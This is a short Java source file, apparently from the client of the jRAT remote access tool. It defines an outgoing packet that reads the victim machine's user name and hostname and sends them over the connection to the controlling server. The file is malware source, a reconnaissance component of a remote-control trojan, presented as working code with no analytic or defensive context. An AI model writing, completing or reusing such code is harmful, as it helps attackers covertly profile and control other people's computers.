package jrat.client.packets.outgoing;

import jrat.client.Connection;
import jrat.common.utils.UserUtils;

public class Packet5InitUserHost implements OutgoingPacket {

	@Override
	public void write(Connection con) throws Exception {
		String username = System.getProperty("user.name");
		String hostname = UserUtils.getHostname();
		
		con.writeLine(username);
		con.writeLine(hostname);
	}

	@Override
	public short getPacketId() {
		return (byte) 5;
	}
}